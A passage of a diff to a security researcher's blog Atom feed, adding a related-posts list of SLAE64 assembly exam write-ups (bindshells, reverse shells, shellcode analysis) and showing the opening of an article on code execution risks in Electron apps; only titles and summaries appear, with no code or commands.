-&lt;/ul&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This blog post covers the 1/7 task of the SLAE certificate exam of creating a 64-bit bindshell which has a check if the correct passphrase is entered upon establishing the connection. Student ID: SLAE64 - 1594</summary></entry><entry><title type="html">Only an Electron Away from Code Execution</title><link href="http://localhost:4000/blog/2018-12-01-electron/" rel="alternate" type="text/html" title="Only an Electron Away from Code Execution" /><published>2018-12-01T00:00:00+02:00</published><updated>2018-12-01T00:00:00+02:00</updated><id>http://localhost:4000/blog/electron</id><content type="html" xml:base="http://localhost:4000/blog/2018-12-01-electron/">&lt;p&gt;This article is supporting my talk at the &lt;a href=&quot;https://nsec.io/speakers/#silvia-v-li&quot;&gt;NorthSec 2018&lt;/a&gt; conference in Montreal titled “Only an Electron Away from Code Execution” and the corresponding slides can be found &lt;strong&gt;&lt;a href=&quot;https://docs.google.com/presentation/d/1uJDFQncxCB_0CddZSPVCq7FhKQVH6ku_RuV17Pbm2RU/edit?usp=sharing&quot;&gt;here&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;related-posts&quot;&gt;Related posts:&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-15-blog-SLAE1/&quot;&gt;64-bit bindshell with a passphrase protection&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-25-blog-SLAE2/&quot;&gt;64-bit reverse shell with passphrase protection&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE3/&quot;&gt;Egghunter (64-bit Linux) using access() syscall&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE4/&quot;&gt;Writing a 64-bit custom encoder (reversed byte order of 4 byte chunks)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE51/&quot;&gt;Msfvenom generated Exec shellcode analysis - exec shellcode&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE52/&quot;&gt;Msfvenom generated bind_tcp shellcode analysis&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE53/&quot;&gt;Msfvenom generated shell_reverse_tcp payload&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE6/&quot;&gt;Polymorphic shellcodes for samples taken from Shell-Storm&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE7/&quot;&gt;Custom encrypter - One-time pad (OTP)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification. The task for 1/7 assignment is to create a 64-bit bindshell with a password protection. If the password is entered correctly, only then the shell gets executed. All 0-bytes should be removed.</summary></entry><entry><title type="html">Only an Electron Away from Code Execution</title><link href="http://localhost:4000/blog/2018-12-01-electron/" rel="alternate" type="text/html" title="Only an Electron Away from Code Execution" /><published>2018-12-01T00:00:00+02:00</published><updated>2018-12-01T00:00:00+02:00</updated><id>http://localhost:4000/blog/electron</id><content type="html" xml:base="http://localhost:4000/blog/2018-12-01-electron/">&lt;p&gt;This article is supporting my talk at the &lt;a href=&quot;https://nsec.io/speakers/#silvia-v-li&quot;&gt;NorthSec 2018&lt;/a&gt; conference in Montreal titled “Only an Electron Away from Code Execution” and the corresponding slides can be found &lt;strong&gt;&lt;a href=&quot;https://docs.google.com/presentation/d/1uJDFQncxCB_0CddZSPVCq7FhKQVH6ku_RuV17Pbm2RU/edit?usp=sharing&quot;&gt;here&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt;
 
 &lt;p&gt;Electron framework enables to create multi-platform desktop applications by only using web technologies like HTML, JavaScript and CSS. This has allowed the adventurous web application developers to cross the border over to the desktop environment with ease. Big names like Skype, Wire, GitKraken, Slack and so many others have already adopted the framework and tons of open source projects in Github and the ones advertised on the official Electron website have followed. Exploring new frameworks is good, but should be done with good caution! I will explain why.&lt;/p&gt;
 
